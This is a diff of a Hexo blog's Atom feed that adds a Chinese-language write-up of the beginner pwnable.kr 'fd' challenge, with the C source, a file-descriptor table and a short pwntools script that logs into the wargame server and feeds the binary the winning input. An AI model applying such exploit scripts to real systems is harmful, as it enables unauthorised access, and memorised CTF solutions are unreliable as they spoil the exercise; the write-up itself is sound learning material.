@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://iCyris.github.io/"/>
-  <updated>2018-02-14T13:29:23.000Z</updated>
+  <updated>2018-03-14T15:31:30.000Z</updated>
   <id>https://iCyris.github.io/</id>
   
   <author>
@@ -14,6 +14,79 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>pwnable.kr writeup</title>
+    <link href="https://iCyris.github.io/2018/03/12/pwnable-kr/"/>
+    <id>https://iCyris.github.io/2018/03/12/pwnable-kr/</id>
+    <published>2018-03-12T06:25:28.000Z</published>
+    <updated>2018-03-14T15:31:30.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>开始学习 pwn 。</p>
+<p>网址：<a href="http://pwnable.kr" target="_blank" rel="external">http://pwnable.kr</a></p>
+<a id="more"></a>
+<hr>
+<h1 id="Toddler’s-Bottle"><a href="#Toddler’s-Bottle" class="headerlink" title="[Toddler’s Bottle]"></a>[Toddler’s Bottle]</h1><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><blockquote>
+<p>Mommy! what is a file descriptor in Linux?</p>
+<ul>
+<li>try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: <a href="https://www.youtube.com/watch?v=blAxTfcW9VU" target="_blank" rel="external">https://www.youtube.com/watch?v=blAxTfcW9VU</a></li>
+</ul>
+<p>ssh fd@pwnable.kr -p2222 (pw:guest)</p>
+</blockquote>
+<p>给出了源码 :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</div><div class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</div><div class="line">	<span class="keyword">int</span> len = <span class="number">0</span>;</div><div class="line">	len = read(fd, buf, <span class="number">32</span>);</div><div class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</div><div class="line">		system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>查询一下 file descriptor ：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Integer value</th>
+<th style="text-align:left">Name</th>
+<th style="text-align:left"><unistd.h> symbolic constant</unistd.h></th>
+<th style="text-align:left"><stdio.h> file stream</stdio.h></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">0</td>
+<td style="text-align:left">Standard input</td>
+<td style="text-align:left">STDIN_FILENO</td>
+<td style="text-align:left">stdin</td>
+</tr>
+<tr>
+<td style="text-align:left">1</td>
+<td style="text-align:left">Standard output</td>
+<td style="text-align:left">STDOUT_FILENO</td>
+<td style="text-align:left">stdout</td>
+</tr>
+<tr>
+<td style="text-align:left">2</td>
+<td style="text-align:left">error</td>
+<td style="text-align:left">STDERR_FILENO</td>
+<td style="text-align:left">stderr</td>
+</tr>
+</tbody>
+</table>
+<p>标准 io 中，read 函数的第一个参数需要为 0 （即标准输入），0x1234 转换为十进制为 4660 ，另外 buf 需要等于 “LETMEWIN\n” ，poc 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">tg_ssh = ssh(host = <span class="string">'pwnable.kr'</span>, user = <span class="string">'fd'</span>, password = <span class="string">'guest'</span>, port = <span class="number">2222</span>)</div><div class="line"><span class="keyword">print</span> (tg_ssh.connected())</div><div class="line"></div><div class="line">sh = tg_ssh.process(argv = [<span class="string">'fd'</span>,<span class="string">'4660'</span>], executable = <span class="string">'./fd'</span>)</div><div class="line"></div><div class="line">sh.sendline(<span class="string">"LETMEWIN"</span>)</div><div class="line"><span class="keyword">print</span> (sh.recvall())</div></pre></td></tr></table></figure>
+<p><code>mommy! I think I know what a file descriptor is!!</code></p>
+<hr>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;开始学习 pwn 。&lt;/p&gt;
+&lt;p&gt;网址：&lt;a href=&quot;http://pwnable.kr&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pwnable.kr&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="PWN" scheme="https://iCyris.github.io/categories/PWN/"/>
+    
+    
+      <category term="CTF" scheme="https://iCyris.github.io/tags/CTF/"/>
+    
+      <category term="PWN" scheme="https://iCyris.github.io/tags/PWN/"/>
+    
+  </entry>
   
   <entry>
     <title>哈希长度扩展攻击</title>
